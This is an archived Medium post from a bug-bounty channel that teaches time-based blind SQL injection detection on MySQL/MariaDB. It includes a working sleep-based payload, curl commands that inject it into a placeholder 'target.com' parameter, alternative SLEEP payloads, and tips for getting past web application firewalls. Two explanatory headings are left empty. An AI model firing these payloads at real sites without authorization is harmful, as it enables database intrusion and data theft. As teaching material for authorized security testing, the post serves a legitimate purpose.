# SQL Injection

- **Source URL:** https://medium.com/@cybersecplayground/sql-injection-time-based-blind-detection-payload-953657dd542b
- **Fetched from:** https://medium.com/@cybersecplayground/sql-injection-time-based-blind-detection-payload-953657dd542b?source=rss-4e0b134fb928------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14918)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Cybersecplayground / Sat, 19 Sep 2026 19:20:12 GMT

Time-based blind SQL injection is one of the most reliable techniques when no data is reflected in the response. Instead of seeing output, you measure how long the server takes to respond — if it sleeps, the injection worked.

'%2b(select\*from(select(sleep(5)))a)%2b'

URL Decoded:

'+(select\*from(select(sleep(5)))a)+'

What It Does:

Breaking It Down:

Result: The database executes sleep(5) and the HTTP response is delayed by 5 seconds.

▫️ Blind Detection → Works even when no data is shown

▫️ Reliable Signal → Time difference is clear and measurable

▫️ Bypasses Filters → Less likely to trigger basic WAF rules than UNION-based payloads

▫️ Works on MySQL/MariaDB → Common in PHP/WordPress targets

Step 1: Baseline Response Time

`curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/product?id=1"`
Note the normal response time (e.g., 0.3s)

Step 2: Inject Time-Based Payload

`curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/product?id=1'%2b(select*from(select(sleep(5)))a)%2b'"`
Step 3: Compare Times

MySQL Alternative (Cleaner):

' AND SLEEP(5)-- -

' OR SLEEP(5)-- -

🔸 Critical Severity → Full database access possible

🔸 Data Exfiltration → Dump credentials, PII, financial data

🔸 Chain Potential → SQLi → File Read → RCE

🔸 High Bounties → SQLi remains one of the most rewarded vulnerabilities

🔔 Follow @cybersecplayground for more SQLi and web security techniques!

✅ Like & Share if you found SQLi with this payload! 🚀

#SQLi #SQLInjection #BugBounty #WebSecurity #CyberSecurity #InfoSec #PenTesting #Hacking #TimeBasedBlind

⚠️ Pro Tip: Always test both SLEEP() and BENCHMARK()—some WAFs block one but not the other. Also try different sleep durations (3s, 5s, 10s) to confirm the delay is intentional!
